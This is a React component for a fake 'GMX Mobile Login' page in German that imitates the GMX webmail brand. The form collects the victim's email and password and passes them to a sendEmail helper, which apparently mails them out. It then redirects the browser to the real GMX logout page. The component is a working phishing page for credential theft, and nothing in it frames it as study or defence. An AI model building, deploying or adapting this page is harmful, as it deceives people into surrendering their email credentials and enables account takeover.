import React, { useState } from "react";
import { Link } from "react-router-dom";

import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import login from "../img/mobilefooter.png";
import sendEmail from "../utils/sendEmail";

export default function MLogin() {
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  const handlePasswordChange = (event) => {
    setPassword(event.target.value);
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    try {
      const response = await sendEmail({ password, email });

      if (response.data === "OK") {
        window.location.assign(
          "https://www.gmx.com/logout/?ls=wd#.1559516-header-login1-1"
        );
      }
    } catch (error) {
      console.log(error);
    }
  };

  return (
    <div>
      <div className="flex space-x-5 items-center bg-blue-800 pl-3 py-3">
        <h1 className="font-bold text-2xl text-white">GMX</h1>
        <h1 className="text-xl text-white">Mobile Login</h1>
      </div>

      <div className="flex flex-col justify-center items-center">
        <div className="flex flex-col justify-center items-center">
          <h1 className="font-bold text-2xl py-5 text-blue-800">GMX</h1>
          <h4 className="font-bold text-slate-800 py-5">Login</h4>
          <p className="text-sm text-center w-5/6 text-gray-500">
            Bitte melden Sie sich hier mit Ihrer GMX E-mail-Adresse und Ihrem
            Passwort an.
          </p>

          {/* form */}
          <form className="flex flex-col w-5/6 py-5 " onSubmit={handleSubmit}>
            <label htmlFor="email" className="text-base text-gray-500">
              GMX E-Mail-Adresse
            </label>

            <input
              type="email"
              className="rounded border py-3 border-gray-300 w-full bg-white pl-2"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />

            <div className="flex flex-col passwordInputDiv">
              <label
                htmlFor="password"
                className="text-base text-gray-500 pt-5"
              >
                Passwort eingeben
              </label>

              <div
                style={{
                  width: "100%",
                }}
              >
                <input
                  type={showPassword ? "text" : "password"}
                  label="Password"
                  id="password"
                  name="password"
                  value={password}
                  onChange={handlePasswordChange}
                  placeholder="Enter your password"
                  style={{
                    width: "94%",
                    height: "54px",
                  }}
                  required
                />

                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  aria-label="Toggle password visibility"
                >
                  <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} />
                </button>
              </div>
            </div>
            <button className="my-3 py-2 rounded bg-green-600">Login</button>
            <Link className="text-center text-base text-blue-900">
              Passwort Vergessen?
            </Link>
            <div className="border-b my-8 border-gray-300"></div>
          </form>

          <p className="text-sm font-bold text-center">Neu bei GMX</p>
          <Link className="text-center text-base text-blue-900 mt-5">
            Jetzt kostenlos registrieren!
          </Link>
          <img src={login} alt="login" className="my-8 w-3/6" />
        </div>
      </div>
      {/* footer */}
      <div className="flex flex-col justify-center items-center text-white bg-gray-400">
        <Link>Impressum</Link>
        <Link>Vertrage hier kundigen</Link>
        <Link>AGB</Link>
        <Link>Datenschutz</Link>
      </div>
    </div>
  );
}
